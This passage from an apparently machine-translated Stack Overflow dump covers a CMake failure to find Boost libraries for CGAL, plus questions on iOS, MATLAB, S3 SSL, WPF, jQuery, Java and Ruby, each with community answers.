41.0;1.41;1.40.1;1.40.0;1.40;1.39.1;1.39.0;1.39;1.38.1;1.38.0;1.38;1.37.1;1.37.0
;1.37
-- [ D:/program files/CMake 2.8/share/cmake-2.8/Modules/FindBoost.cmake:576 ] Bo
ost_NO_SYSTEM_PATHS =
-- [ D:/program files/CMake 2.8/share/cmake-2.8/Modules/FindBoost.cmake:644 ] De
clared as CMake or Environmental Variables:
-- [ D:/program files/CMake 2.8/share/cmake-2.8/Modules/FindBoost.cmake:646 ]
BOOST_ROOT = D:/program files/boost_1_51/bin
-- [ D:/program files/CMake 2.8/share/cmake-2.8/Modules/FindBoost.cmake:648 ]
BOOST_INCLUDEDIR =
-- [ D:/program files/CMake 2.8/share/cmake-2.8/Modules/FindBoost.cmake:650 ]
BOOST_LIBRARYDIR =
-- [ D:/program files/CMake 2.8/share/cmake-2.8/Modules/FindBoost.cmake:652 ] _b
oost_TEST_VERSIONS = 1.56.1;1.56.0;1.56;1.55.1;1.55.0;1.55;1.54.1;1.54.0;1.54;1.
53.1;1.53.0;1.53;1.52.1;1.52.0;1.52;1.51.1;1.51.0;1.51;1.50.1;1.50.0;1.50;1.49.1
;1.49.0;1.49;1.48.1;1.48.0;1.48;1.47.1;1.47.0;1.47;1.46.1;1.46.0;1.46;1.45.1;1.4
5.0;1.45;1.44.1;1.44.0;1.44;1.43.1;1.43.0;1.43;1.42.1;1.42.0;1.42;1.41.1;1.41.0;
1.41;1.40.1;1.40.0;1.40;1.39.1;1.39.0;1.39;1.38.1;1.38.0;1.38;1.37.1;1.37.0;1.37
;1.56.0;1.56;1.55.0;1.55;1.54.0;1.54;1.53.0;1.53;1.52.0;1.52;1.51.0;1.51;1.50.0;
1.50;1.49.0;1.49;1.48.0;1.48;1.47.0;1.47;1.46.1;1.46.0;1.46;1.45.0;1.45;1.44.0;1
.44;1.43.0;1.43;1.42.0;1.42;1.41.0;1.41;1.40.0;1.40;1.39.0;1.39;1.38.0;1.38;1.37
.0;1.37;1.36.1;1.36.0;1.36;1.35.1;1.35.0;1.35;1.34.1;1.34.0;1.34;1.33.1;1.33
-- [ D:/program files/CMake 2.8/share/cmake-2.8/Modules/FindBoost.cmake:734 ] lo
cation of version.hpp: D:/program files/boost_1_51/boost/version.hpp
-- [ D:/program files/CMake 2.8/share/cmake-2.8/Modules/FindBoost.cmake:754 ] ve
rsion.hpp reveals boost 1.51.0
-- [ D:/program files/CMake 2.8/share/cmake-2.8/Modules/FindBoost.cmake:786 ] gu
essed _boost_COMPILER = -vc100
-- [ D:/program files/CMake 2.8/share/cmake-2.8/Modules/FindBoost.cmake:796 ] _b
oost_MULTITHREADED = -mt
-- [ D:/program files/CMake 2.8/share/cmake-2.8/Modules/FindBoost.cmake:839 ] _b
oost_RELEASE_ABI_TAG = -
-- [ D:/program files/CMake 2.8/share/cmake-2.8/Modules/FindBoost.cmake:841 ] _b
oost_DEBUG_ABI_TAG = -gd
-- [ D:/program files/CMake 2.8/share/cmake-2.8/Modules/FindBoost.cmake:884 ] _b
oost_LIBRARY_SEARCH_DIRS = D:/program files/boost_1_51/bin/lib;D:/program files/
boost_1_51/bin/stage/lib;D:/program files/boost_1_51/lib;D:/program files/boost_
1_51/../lib;D:/program files/boost_1_51/stage/lib;C:/boost/lib;C:/boost;C:\Progr
am Files (x86)/boost/boost_1_51_0/lib;C:\Program Files (x86)/boost/boost_1_51/li
b;C:\Program Files (x86)/boost/lib;C:\Program Files (x86)/boost;/sw/local/lib
-- [ D:/program files/CMake 2.8/share/cmake-2.8/Modules/FindBoost.cmake:962 ] Se
arching for THREAD_LIBRARY_RELEASE: boost_thread-vc100-mt-1_51;boost_thread-vc10
0-mt;boost_thread-mt-1_51;boost_thread-mt;boost_thread
-- [ D:/program files/CMake 2.8/share/cmake-2.8/Modules/FindBoost.cmake:994 ] Se
arching for THREAD_LIBRARY_DEBUG: boost_thread-vc100-mt-gd-1_51;boost_thread-vc1
00-mt-gd;boost_thread-mt-gd-1_51;boost_thread-mt-gd;boost_thread-mt;boost_thread

-- [ D:/program files/CMake 2.8/share/cmake-2.8/Modules/FindBoost.cmake:962 ] Se
arching for SYSTEM_LIBRARY_RELEASE: boost_system-vc100-mt-1_51;boost_system-vc10
0-mt;boost_system-mt-1_51;boost_system-mt;boost_system
-- [ D:/program files/CMake 2.8/share/cmake-2.8/Modules/FindBoost.cmake:994 ] Se
arching for SYSTEM_LIBRARY_DEBUG: boost_system-vc100-mt-gd-1_51;boost_system-vc1
00-mt-gd;boost_system-mt-gd-1_51;boost_system-mt-gd;boost_system-mt;boost_system

-- [ D:/program files/CMake 2.8/share/cmake-2.8/Modules/FindBoost.cmake:1108 ] B
oost_FOUND = FALSE
CMake Error at D:/program files/CMake 2.8/share/cmake-2.8/Modules/FindBoost.cmak
e:1192 (message):
  Unable to find the requested Boost libraries.

  Boost version: 1.51.0

  Boost include path: D:/program files/boost_1_51

  The following Boost libraries could not be found:

          boost_thread
          boost_system

  No Boost libraries were found.  You may need to set BOOST_LIBRARYDIR to the
  directory containing Boost libraries or BOOST_ROOT to the location of
  Boost.
Call Stack (most recent call first):
  cmake/modules/CGAL_SetupBoost.cmake:6 (find_package)
  cmake/modules/CGAL_SetupDependencies.cmake:85 (include)
  CMakeLists.txt:590 (include)

-- Boost include:     D:/program files/boost_1_51
-- Boost libraries:
-- Boost definitions:
-- USING BOOST_VERSION = '1.51.0'
== Detect external libraries (DONE) ==

== Write compiler_config.h ==
== Write compiler_config.h (DONE) ==

== Generating build files ==
Configuring libCGAL
-- Requested component: MPFR
-- Requested component: GMP
libCGAL is configured
-- Sources for CGAL component library 'Core' detected
Configuring libCGAL_Core
-- Requested component: MPFR
-- Requested component: GMP
libCGAL_Core is configured
-- Sources for CGAL component library 'ImageIO' detected
Configuring libCGAL_ImageIO
-- Could NOT find ZLIB (missing:  ZLIB_LIBRARY ZLIB_INCLUDE_DIR)
-- OpenGL include:
-- OpenGL libraries:   glu32;opengl32
-- Requested component: MPFR
-- Requested component: GMP
libCGAL_ImageIO is configured
-- NOTICE: CGAL_ImageIO needs ZLib to read compressed files. That feature will n
ot be activated.
-- Sources for CGAL component library 'Qt3' detected
Configuring libCGAL_Qt3
-- CGAL_Qt3 needs Qt3, cannot be configured.
-- Sources for CGAL component library 'Qt4' detected
Configuring libCGAL_Qt4
-- USING OPENGL_VERSION = '1.1'
-- USING QT4_VERSION = '4.8.3'
-- OpenGL include:
-- OpenGL libraries:   glu32;opengl32
-- OpenGL definitions:
-- Qt4 include:        D:/QT/include
-- Qt4 libraries:      optimized;D:/QT/lib/qtmain.lib;debug;D:/QT/lib/qtmaind.li
b;optimized;D:/QT/lib/QtOpenGL4.lib;debug;D:/QT/lib/QtOpenGLd4.lib;optimized;D:/
QT/lib/QtGui4.lib;debug;D:/QT/lib/QtGuid4.lib;optimized;D:/QT/lib/QtCore4.lib;de
bug;D:/QT/lib/QtCored4.lib
-- Qt4 definitions:    -DQT_DLL
-- moc executable:     D:/QT/bin/moc.exe
-- uic executable:     D:/QT/bin/uic.exe
-- Requested component: MPFR
-- Requested component: GMP
libCGAL_Qt4 is configured
-- Sources for CGAL component libraries 'CGAL;Core;ImageIO;Qt3;Qt4' detected
== Generating build files (DONE) ==

-- Configuring incomplete, errors occurred! 
```

[（我看到至少三个与这个问题同名的问题。他们每个人都有不同的答案，适用于 OP，但不适用于我，所以很抱歉重复这个问题......）]

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-11-08T01:58:57.570

您的输出显示 CMake 正在以下位置搜索库：

```
D:/program files/boost_1_51/bin/lib
D:/program files/boost_1_51/bin/stage/lib
D:/program files/boost_1_51/lib
D:/program files/boost_1_51/../lib
D:/program files/boost_1_51/stage/lib
C:/boost/lib
C:/boost
C:\Program Files (x86)/boost/boost_1_51_0/lib
C:\Program Files (x86)/boost/boost_1_51/lib
C:\Program Files (x86)/boost/lib
C:\Program Files (x86)/boost
/sw/local/lib 
```

它还表明它期望以某种方式命名库。比如Boost.Thread的发布版本：

```
boost_thread-vc100-mt-1_51
boost_thread-vc100-mt
boost_thread-mt-1_51
boost_thread-mt
boost_thread 
```

如果您的 Boost 库确实存在于搜索到的位置之一，那么问题可能出在库的名称上。[您可以通过设置与FindBoost 模块](http://www.cmake.org/cmake/help/v2.8.10/cmake.html#module:FindBoost)相关的适当 CMake 变量来调整 Boost 库的预期名称。

例如，如果您使用 bjam 构建 Boost，`link=static threading=multi`然后在您的 CMakeLists.txt 中`find_package(Boost ...)`使用

```
set(Boost_USE_STATIC_LIBS ON)
set(Boost_USE_MULTITHREADED ON) 
```

或调用 CMake 与`-DBoost_USE_STATIC_LIBS=ON -DBoost_USE_MULTITHREADED=ON`.

正如@noam 在下面的评论中指出的那样，在这种特殊情况下，CGAL 似乎需要 Boost 库的共享（DLL）版本；在命令行上传递`-DBoost_USE_STATIC_LIBS=ON`没有任何效果。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2013-02-19T21:54:43.817

我有这个错误，但我已经进步了。

我使用的是 CMake GUI，勾选了“高级”复选框（在“分组”复选框和“添加条目”按钮之间），并勾选了新看到的复选框“CGAL_Boost_USE_STATIC_LIBS”。

在显示额外选项之前，您可能需要再按一两次“配置”。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-11-30T21:39:57.623

今天我尝试在 Windows 上使用 Boost 1.57 x64 安装 CGAL 并遇到了同样的问题。我通过预构建二进制文件安装了 Boost，CMake 搜索的 .lib 文件位于该`lib64-msvc-12.0`文件夹中。

因此，添加`BOOST_LIBRARYDIR=.../boost_1_57_0/lib64-msvc-12.0`到 CMake 选项是我的解决方案。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2018-03-28T13:46:09.813

您的系统（通过 CMake）无法找到 Boost 编译的静态库（.a 文件）。因此，请尝试在系统中存在 .a 文件的 CMake 文件中包含路径。例如，

```
set(BOOST_LIBRARYDIR {Path_here_to_boost_Static_libraries}). 
```

这对我有用。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2013-02-27T07:29:03.690

1.  CGAL 使用共享的 Boost 库。因此，像“libboost_thread-vc100-mt-p-1_49.lib”这样的库是静态链接库。

2.  这是因为 CMake（我使用的是 v2.8.9）无法正确读取 Boost 库的名称。当我将库名称 **boost_thread-vc100-mt-p-1_49.dll**和**boost_thread-vc100-mt-p-1_49.lib 分别更改**为**boost_thread-vc100-mt-1_49.dll**和**boost_thread-vc100-mt-1_49**时，它解决了这个问题。

# ios - ios5和ios6的兼容性

> ID：13280826
> 
> 赞同：0
> 
> 时间：2012-11-08T00:50:42.023
> 
> 标签：ios, ios5, ios6

我有一个关于 ios5 与 ios6 不兼容的问题

当我使用 ios5 处理我的项目时

```
label.textAlignment = UITextAlignmentCenter; 
```

然后更新到ios6

```
label.textAlignment = NSLineBreakByTruncatingTail; 
```

一旦我在安装了 ios5 的设备上运行我的代码，就会出现错误。

我即将将我的应用上传到 appstore，但我希望我的应用也支持 ios5。我将如何处理 ios5 和 ios6！

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T00:58:25.427

NSTextAlignment的[可接受值为](http://developer.apple.com/library/ios/#documentation/uikit/reference/NSString_UIKit_Additions/Reference/Reference.html#//apple_ref/doc/c_ref/NSTextAlignment)：

*   NSTextAlignmentLeft
*   NSTextAlignmentCenter
*   NSTextAlignmentRight
*   NSTextAlignmentJustified
*   NSTextAlignment自然

前三个中的任何一个都将在 iOS 5 和 6 下同样工作。

`NSLineBreakByTruncatingTail`不是真正有效的文本对齐类型，尽管`NSTextAlignmentNatural`由于 C 枚举的排列方式，它在运行时看起来像。

因此，您需要全面切换`NSTextAlignmentLeft`或进行功能检查。值得庆幸的是，文本对齐类型的更改支持将属性字符串推送到`UILabel`（和其他地方）的新功能，这样你就有了一些东西可以挂起。

例如

```
if([label respondsToSelector:@selector(attributedText)])
    label.textAlignment = NSTextAlignmentNatural;
else
    label.textAlignment = NSTextAlignmentLeft; 
```

尽管 else 在技术上是多余的，因为`NSTextAlignmentLeft`它是默认值。

# matlab - 错误：超出程序允许的最大变量大小。在使用 sub2ind 时

> ID：13280833
> 
> 赞同：2
> 
> 时间：2012-11-08T00:51:24.483
> 
> 标签：matlab, sparse-matrix

请建议如何解决这个问题：

```
nNodes = 50400;
adj = sparse(nNodes,nNodes);

adj(sub2ind([nNodes nNodes], ind, ind + 1)) = 1; %ind is a vector of indices
??? Maximum variable size allowed by the program is exceeded. 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T06:41:01.557

我认为问题与 32/64 位有关。如果你有一个 32 位处理器，你最多可以寻址

```
2^32 = 4.294967296e+09 
```

元素。如果你有一个 64 位处理器，这个数字增加到

```
2^64 = 9.223372036854776e+18 
```

不幸的是，由于对我来说充其量是模糊的原因，Matlab 没有使用这个完整的范围。要找出 Matlab 使用的实际范围，请发出以下命令：

```
[~,maxSize] = computer 
```

在 32 位系统上，这给出

```
>> [~,maxSize] = computer
maxSize =
    2.147483647000000e+09
>> log2(maxSize)
ans =
    3.099999999932819e+01 
```

在 64 位系统上，它给出

```
>> [~,maxSize] = computer
maxSize =
    2.814749767106550e+14
>> log2(maxSize)
ans =
    47.999999999999993 
```

显然，在 32 位系统上，Matlab 仅使用 31 位来寻址元素，这为您提供了上限。

> **如果有人能澄清为什么 Matlab 在 32 位系统上只使用 31 位，而在 64 位系统上只使用*48*位，那就太棒了:)**

在内部，Matlab 总是使用线性索引来访问数组中的元素（它可能只是使用 C 风格的数组左右），这意味着您的`adj`矩阵它的最终元素是

```
finEl = nNodes*nNodes = 2.54016e+09 
```

不幸的是，这大于 31 位可寻址的最大值。因此，在 32 位系统上，

```
>> adj(end) = 1;
??? Maximum variable size allowed by the program is exceeded. 
```

而这个命令在 64 位系统上完全没有问题。

您必须在 32 位系统上使用解决方法：

```
nNodes = 50400;

% split sparse array up into 4 pieces
adj{1,1} = sparse(nNodes/2,nNodes/2);    adj{1,2} = sparse(nNodes/2,nNodes/2);
adj{2,1} = sparse(nNodes/2,nNodes/2);    adj{2,2} = sparse(nNodes/2,nNodes/2); 

% assign or index values to HUGE sparse arrays
function ret = indHuge(mat, inds, vals)

    % get size of cell
    sz = size(mat);

    % return current values when not given new values
    if nargin < 3
        % I have to leave this up to you...

    % otherwise, assign new values 
    else
        % I have to leave this up to you...

    end
end    

% now initialize desired elements to 1
adj = indHuge(adj, sub2ind([nNodes nNodes], ind, ind + 1),  1); 
```

我只是想将所有这些转换成一个适当的类，这样你就可以使用更直观的语法......但这比我现在有时间要多得多:)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-08T06:39:54.867

```
adj = sparse(ind, ind + 1, ones(size(ind)), nNodes, nNodes, length(ind)); 
```

这工作得很好......

而且，如果我们必须访问稀疏矩阵的最后一个元素，我们可以通过 adj(nNodes, nNodes) 访问，但是 adj(nNodes * nNodes) 会抛出错误。

# http - AWS S3 虚拟主机 SSL 不提供索引页面

> ID：13280836
> 
> 赞同：3
> 
> 时间：2012-11-08T00:51:41.330
> 
> 标签：http, ssl, amazon-s3

我无法协调 AWS S3 虚拟主机的问题。导航到主机名时，我需要提供 SSL 和索引页面。

*   通过纯文本提供索引页面：http: [//hjr-test.s3-website-us-east-1.amazonaws.com/](http://hjr-test.s3-website-us-east-1.amazonaws.com/)
*   无法通过 SSL 访问：[https ://hjr-test.s3-website-us-east-1.amazonaws.com/](https://hjr-test.s3-website-us-east-1.amazonaws.com/)
*   可通过 SSL 访问，但不提供索引页面：[https ://hjr-test.s3.amazonaws.com/](https://hjr-test.s3.amazonaws.com/)
*   可通过 SSL 访问并提供显式页面：[https ://hjr-test.s3.amazonaws.com/index.html](https://hjr-test.s3.amazonaws.com/index.html)

有没有办法可以让我访问 SSL 并提供索引页面？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T01:06:34.677

没有来自 S3 网站端点的 SSL。对不起

```
$ nc -zv hjr-test.s3-website-us-east-1.amazonaws.com 443
nc: connect to hjr-test.s3-website-us-east-1.amazonaws.com port 443 (tcp) failed: Connection refused
$ nc -zv hjr-test.s3-website-us-east-1.amazonaws.com 80
Connection to hjr-test.s3-website-us-east-1.amazonaws.com 80 port [tcp/http] succeeded! 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2018-03-02T01:34:40.173

尽我所能，有两种方法可以访问您的 s3 存储桶：

*   一个普通的**s3** url（您问题中的示例 2 和 4）
*   **提供一些额外功能的**网站网址（示例 1 和 3）****

 ****s3** url 支持 SSL，但它只是从存储桶中获取的原始“get” 。没有花哨的东西。网站url 支持特定于**网站**的特殊功能，例如重定向规则和自动索引页面重定向，但不支持 SSL。

我不知道为什么网站网址不支持 SSL。也许亚马逊还没有实施？也许他们出于某种原因希望您使用非特定于区域的域？也许他们希望您使用 CloudFront？也许他们秘密的蜥蜴人霸主委员会已经禁止了它，并处以死刑。

我敢肯定，一旦有人向我解释，我就会明白这一点。

无论如何，这是我在闲逛之后的理解。我对这些东西还很陌生，所以对它持保留态度。**

# c# - WPF - 以反向顺序（从下到上）列表框滚动错误

> ID：13280837
> 
> 赞同：1
> 
> 时间：2012-11-08T00:51:50.740
> 
> 标签：c#, wpf, listbox, scrollbar

我有以下代码来反转a `ListBox`（项目从下到上放置）：

```
<ListBox HorizontalContentAlignment="Stretch">          
    <ListBox.ItemsPanel>
        <ItemsPanelTemplate>
            <VirtualizingStackPanel VerticalAlignment="Bottom"  Orientation="Vertical">
                <VirtualizingStackPanel.LayoutTransform>
                    <ScaleTransform ScaleX="1" ScaleY="-1" />
                </VirtualizingStackPanel.LayoutTransform>
            </VirtualizingStackPanel>
        </ItemsPanelTemplate>
    </ListBox.ItemsPanel>
    <ListBox.ItemContainerStyle>
        <Style TargetType="ListBoxItem">
            <Setter Property="LayoutTransform">
                <Setter.Value>
                    <ScaleTransform ScaleX="1" ScaleY="-1" />
                </Setter.Value>
            </Setter>
        </Style>
    </ListBox.ItemContainerStyle>
</ListBox> 
```

如果你添加一些项目，你会看到滚动条是错误的（原来的而不是反向的）。我能做些什么来像处理内容一样转换滚动条？顺便说一句，如果您 `ScrollViewer.CanContentScroll="False"`在 ListBox 中设置滚动就可以了。但随后虚拟化就丢失了。

# javascript - 制作 javascript 游戏时出现 GET 错误

> ID：13280838
> 
> 赞同：0
> 
> 时间：2012-11-08T00:51:56.747
> 
> 标签：javascript, file, get, include

我正在制作一个简单的 javascript 游戏引擎来取乐，并且在处理它时遇到了一种烦人的问题。

目前，我包含 javascript 文件的方式是拥有一个 index.html 页面，该页面调用我的 javascript“main”，并`<script type="text/javascript"`在该部分中包含我所有带有标签的javascript 文件`<head>`。

这工作得相当好，除了可能有六分之一左右的页面刷新它无法加载其中一个 javascript 文件。我收到一个错误，例如：`GET http://localhost:8000/js/Input.js`。当所有文件组合在一起并缩小时它工作正常，所以我认为这与文件的异步加载和游戏在所有内容加载之前开始有关？不过我不确定。我现在包含大约 25 个文件，随着我添加更多文件，问题似乎变得更糟。

有没有更好的方法来包含 javascript 文件？我正在努力让这件事尽可能简单，所以我不想做大量的服务器端工作。（目前我只是在 python 中使用 SimpleHTTP 服务器命令）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T03:56:36.877

如果错误是 HTTP 错误，并且失败时的 URL 与成功时的 URL**完全相同**，那么问题与您的 JS 无关，而与您的 Web 服务器有关。

但是，如果您使用的是*$.getScript*之类的东西并且错误与一些未初始化的变量有关，那么您可能正在循环所有要包含的脚本并为每个脚本执行一个*getScript*。如果是这样，由于*getScript*使用 AJAX 请求来加载 JS，因此无法保证脚本的执行顺序。为了解决这个问题，如果您不介意性能下降，因为这种情况似乎仅在您的开发环境中运行时，您可以链接请求，以便在加载前一个（必需的）JS文件之前不发出请求，因此顺序执行您的脚本文件：

```
var dfr = $.Deferred().resolve();
var scripts = ["script1.js", "..."];

$.each(scripts, function(i, script) {
    dfr = dfr.pipe(function() {
        $.getScript(script);
    });
}); 
```

# javascript - jQuery函数：将回调函数作为可选参数传递给另一个函数

> ID：13280839
> 
> 赞同：2
> 
> 时间：2012-11-08T00:52:04.393
> 
> 标签：javascript, jquery, callback

我编写了以下便利功能，让我可以轻松地将 jquery UI 自动完成功能放在元素上。

```
jQuery.fn.bindAutocomplete = function() {
  $(this).each( function() {
    $(this).autocomplete({
      source: $(this).data('autocomplete-source')
    });
  });
} 
```

我总是使用附加`data-autocomplete-source`到元素的约定，所以我可以在任何地方调用它，就像这样：

```
$('input#name').bindAutocomplete(); 
```

现在，自动完成函数可以在选项哈希之后将回调函数作为可选参数。我几乎从不需要弄乱它，但我发现在少数情况下我想传递一个成功函数。显然，当我需要传递回调时，我可以重写完整的自动完成函数，但我宁愿重写我的`bindAutocomplete()`函数，以便它可以接受可选的回调函数并将它们传递给`autocomplete()`.

那么，你是怎么做到的呢？

* * *

*更新*

我尝试了这个，基于以下接近但不完全的答案：

```
jQuery.fn.bindAutocomplete = function(callbacks) {
  $(this).each( function(callbacks) {
    options = $.extend({source: $(this).data('autocomplete-source')}, callbacks);
    $(this).autocomplete(options);
  });
} 
```

无论您是否传递回调，这都会正确绑定自动完成功能，但如果您确实传递回调，它们不会被调用。

即：以下触发自动完成但不是回调。

```
$('input#name').bindAutocomplete({ select: function(){alert("working");} }) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T00:57:06.570

如果这就是你的意思，我想你可以这样做......

```
jQuery.fn.bindAutocomplete = function( opts ) {        
  return this.each(function(){
    opts = $.extend({
      source: $(this).data('autocomplete-source')
    }, opts);
    $(this).autocomplete( opts );
  });
}

$('input#name').bindAutocomplete({
  change: function() { ... },
  close: function() { ... }
}); 
```

# java - 无法让 compChoice 不返回 null

> ID：13280841
> 
> 赞同：0
> 
> 时间：2012-11-08T00:52:32.457
> 
> 标签：java, null

这是我为核心程序本身提供的代码：

```
import java.util.Scanner;
import static java.lang.System.*;

public class RockPaperScissors
{
private String playChoice;
private String compChoice;

public RockPaperScissors()
{

}

public RockPaperScissors(String player)
{
    playChoice = player;
}

public void setPlayers(String player)
{
    playChoice = player;
    compChoice = "";
    int num;
    num = (int) (Math.random()*3);
    switch(num)
    {
    case 0 : compChoice = "R";break;
    case 1 : compChoice = "P";break;
    case 2 : compChoice = "S";break;
    }

    System.out.println(num + " " + compChoice);
    out.print(compChoice);
}

public String determineWinner()
{
    String winner="";

    if(playChoice == "R")
    {
        switch(compChoice)
        {
        case "R" : winner = "!Draw Game!";break;
        case "P" : winner = "!Computer wins <<Paper Covers Rock>>!";break;
        case "S" : winner = "!Player wins <<Rock Breaks Scissors>>!";break;
        }
    }
    else if(playChoice == "P")
    {
        switch(compChoice)
        {
        case "R" : winner = "!Player wins <<Paper Covers Rock>>!";break;
        case "P" : winner = "!Draw Game!";break;
        case "S" : winner = "!Computer wins <<Scissors Cuts Paper>>!";break;
        }
    }
    else if(playChoice == "S")
    {
        switch(compChoice)
        {
        case "R" : winner = "!Computer wins <<Rock Breaks Scissors>>!";break;
        case "P" : winner = "!Player wins <<Scissors Cuts Paper>>!";break;
        case "S" : winner = "!Draw Game!";break;
        }
    }
    return winner;
}

public String toString()
{
    String output="";

    output = "player had " + playChoice + "\n computer had " + compChoice + "\n " + determineWinner();

    return output;
}
} 
```

这是我的跑步者课程：

```
import java.util.Scanner;
import static java.lang.System.*;

public class Lab10d
{
public static void main(String args[])
{
    Scanner keyboard = new Scanner(System.in);
    char response  ;

    //add in a do while loop after you get the basics up and running

        String player = "";

        out.print("Rock-Paper-Scissors - pick your weapon [R,P,S] :: ");

        //read in the player value
        player = keyboard.next();

        RockPaperScissors game = new RockPaperScissors(player);
        game.determineWinner();
        out.println(game);
    while(response.equals('y'))
    {
        out.print("Rock-Paper-Scissors - pick your weapon [R,P,S] :: ");
        player = keyboard.next();
        game.setPlayers(player);
        game.determineWinner();
        out.println(game + "\n");
        out.println("would you like to play again? (y/n):: ");
        response=  keyboard.next();

    }

}
} 
```

这是应该产生的结果的示例：

> Rock-Paper-Scissors - 选择你的武器[R,P,S]:: R
> 
> 玩家有 R
> 
> 电脑有P
> 
> !电脑赢了<>！
> 
> 你想再玩一次吗？是的

如果你把 n 再次播放，它就会停止。

主要问题是让 compChoice 不说 null

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T01:09:36.553

您在`main`方法中的代码：

```
RockPaperScissors game = new RockPaperScissors(player);
game.determineWinner(); 
```

您在方法中初始化`compChoice`字符串`setPlayers()`，但该方法永远不会被调用。然后你打开`compChoice`，它是空的，这样你就得到了`NullPointerException`。

这应该可以解决您的问题：

```
RockPaperScissors game = new RockPaperScissors(player);
game.setPlayers(player); // <-- insert this line.
game.determineWinner(); 
```

但请注意，您没有保存由返回的字符串`determineWinner()`，然后调用`out.println(game);`它将`determineWinner()`再次调用该方法...

还有你的这段代码

`while(response == response)`

将永远是一个无限循环，我在你的循环中找不到`break`语句。

也**永远不要**比较字符串`==`，使用等于，谷歌解释，甚至有数百种解释。所以这

`if (playChoice == "R") // <-- WRONG`

应该变成这样：

`if (playChoice.equals("R")) // <-- right`

或者

`if ("R".equals(playChoice)) // <-- right`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T01:14:04.363

我只是快速浏览了您的代码，并没有实际测试/运行您的代码。但是我发现了这个：使用String equals方法来比较字符串，不要使用==来比较字符串。

# ruby - 将 ActiveRecord 与 DelegateClass 一起使用

> ID：13280846
> 
> 赞同：5
> 
> 时间：2012-11-08T00:53:02.363
> 
> 标签：ruby, ruby-on-rails-3.2

使用 rails 3.2.8 我有一个具有几个属性的模型设置

```
class MyModel < ActiveRecord::Base
  attr_accessible :foo, :bar
end 
```

我有另一个使用上述作为委托类的类设置

```
class MyModelPresenter < DelegateClass(MyModel)
  def initialize(month, obj)
    @month = month
    super(obj)
  end

  def self.build(month, attributes = { })
    new(month, MyModel.new).tap do |p|
      p.attributes = attributes
    end
  end

  def attributes=(attributes)
    attributes.each { |k, v| send("#{k}=", v) }
  end
end 
```

当我像这样创建一个新的 MyModelPresenter 时：

```
MyModelPresenter.build(Date.today, {:foo => 1}) 
```

我得到以下回复

```
NoMethodError: undefined method `foo=' for #<MyModel:0x1098f31a8>
    from /Users/me/.rbenv/versions/ree-1.8.7-2011.03/lib/ruby/gems/1.8/gems/activemodel-3.2.8/lib/active_model/attribute_methods.rb:404:in `method_missing'
    from /Users/me/.rbenv/versions/ree-1.8.7-2011.03/lib/ruby/gems/1.8/gems/activerecord-3.2.8/lib/active_record/attribute_methods.rb:149:in `method_missing'
    from /Users/me/dev/temp/app/presenters/my_model_presenter.rb:23:in `send'
    from /Users/me/dev/temp/app/presenters/my_model_presenter.rb:23:in `attributes='
    from /Users/me/dev/temp/app/presenters/my_model_presenter.rb:23:in `each'
    from /Users/me/dev/temp/app/presenters/my_model_presenter.rb:23:in `attributes='
    from /Users/me/dev/temp/app/presenters/my_model_presenter.rb:17:in `build'
    from /Users/me/dev/temp/app/presenters/my_model_presenter.rb:15:in `tap'
    from /Users/me/dev/temp/app/presenters/my_model_presenter.rb:15:in `build' 
```

由于某种原因，模型上的数据库属性没有被定义（setter 或 getter）。在升级到 rails 3.2 之前，这一切都在 rails 3.1 应用程序中工作。

有谁知道为什么没有定义模型的属性方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T23:07:37.523

继承`Delegator`而不是使用`DelegateClass`解决了这个问题。这是最后一课的样子：

```
class MyModelPresenter < Delegator
  def initialize(month, obj)
    @month = month
    super(obj)
    @_sd_obj = obj
  end

  def __getobj__
    @_sd_obj
  end

  def self.build(month, attributes = { })
    new(month, MyModel.new).tap do |p|
      p.attributes = attributes
    end
  end

  def attributes=(attributes)
    attributes.each { |k, v| send("#{k}=", v) }
  end
end 
```

如您所见，我还必须添加该`def __getobj__`方法。并`@_sd_obj`在初始化程序中设置为我委托的类的实例。

请参阅[`SimpleDelegator`](http://www.ruby-doc.org/stdlib-1.9.3/libdoc/delegate/rdoc/Delegator.html)示例。

# javascript - d3.js：强制布局是否仅适用于圆圈？

> ID：13280847
> 
> 赞同：2
> 
> 时间：2012-11-08T00:53:05.873
> 
> 标签：javascript, d3.js, force-layout

我正在使用 d3.force 来设置节点并有连接每个节点的链接。当我使用圆圈作为节点时，这一切都很好：

```
 var nodes = [{ title: "ABC", group: 1 }, { title: "DEF", group: 1 }, { title: "Blah", group: 1 }];
  var links = [{ source: 0, target: 1 }, { source: 0, target: 2 }];

  var force = d3.layout.force()
    .charge(-120)
    .linkDistance(function(d) {
      console.log(d);
      return 250 * Math.random() + 100;
    })
    .size([r, r]);

  force.links(links)
    .nodes(nodes)
    .start();

  var link = svg.selectAll("line.link")
    .data(links)
    .enter()
    .append("line")
    .attr("class", "link")
    .style("stroke-width", 1);

  var node = svg.selectAll("circle.node")
    .data(nodes)
    .enter()
    .append("circle")
    .attr("class", "node")
    .attr("r", 15)
    .call(force.drag); 
```

但是，如果我将节点更改为使用“g”，它将停止工作：

```
 var node = svg.selectAll("g.node")
    .data(nodes)
    .enter()
    .append("g")
    .attr("class", "node")
    .attr("r", 15)
    .call(force.drag);

  var circle = node.append("circle")
    .attr("fill", function(d) {
      var b = Math.floor(255 * Math.random()),
          rgba = "rgba(0, 0, " + b + ", 0.7)";

      return rgba;
    })
    .attr("r", 15); 
```

我可以看到圆圈被添加到 g 元素中，但它们不在应有的位置，并且它们没有通过链接连接。

我真的很想使用“g”元素作为节点，这样我就可以向它添加文本。有没有人对此有任何见解？

或者，如果有办法将文本添加到“圆圈”元素。我也对此持开放态度。

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T04:06:32.223

尝试将其合并到一个语句中，最后调用：

```
